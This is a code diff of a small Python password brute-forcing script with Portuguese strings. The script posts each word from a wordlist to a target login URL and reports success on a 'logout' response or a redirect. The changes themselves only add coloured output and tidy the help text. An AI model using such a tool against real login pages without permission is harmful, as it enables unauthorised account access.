@@ -1,5 +1,7 @@
 import requests
 import sys
+from colorama import Fore, Back, Style, init
+init(autoreset=True)
 
 def brute_force_senha(alvo, wordlist, user):
         try:
@@ -13,13 +15,13 @@ def brute_force_senha(alvo, wordlist, user):
                     }
                     response = requests.post(alvo, data=data)
                     if "logout" in response.text.lower() or response.status_code == 302:
-                        print(f"[+] Senha encontrada: {senha}")
+                        print(Fore.GREEN + f"[+] Senha encontrada: {Style.BRIGHT + senha + Style.NORMAL}")
                         return
-                    print(f"[-] Tentativa com a senha: {senha} falhou.")
+                    print(Fore.RED + f"[-] Tentativa com a senha: {Style.BRIGHT + senha + Style.NORMAL} falhou.")
         except FileNotFoundError:
-            print(f"[!] Arquivo {wordlist} não encontrado.")
+            print(Fore.RED + f"[!] Arquivo {wordlist} não encontrado.")
         except Exception as e:
-            print(f"[!] Erro inesperado: {e}")
+            print(Fore.RED + f"[!] Erro inesperado: {e}")
 
 
 if __name__ == "__main__":
@@ -35,7 +37,7 @@ if __name__ == "__main__":
         else:
             print('Argumentos invalidos')
     elif sys.argv[1] == '-h':
-        print(f"""
+        print(Fore.YELLOW + f"""
         {'='*50}
         MANUNAL
         {'='*50}
@@ -44,11 +46,11 @@ if __name__ == "__main__":
         [-w] -> set wordlist
         {'='*50}
         [!] Modo de uso exemplo simples: 
-        [python3 bruforht.py -a <url_alvo> -w <wordlist> ]
+        [ python3 bruforht.py -a <url_alvo> -w <wordlist>]
         {'='*50}
         """)
     else:
-                print(f"""
+        print(Fore.YELLOW + f"""
         {'='*50}
         PARAMETROS INVALIDOS
         {'='*50}
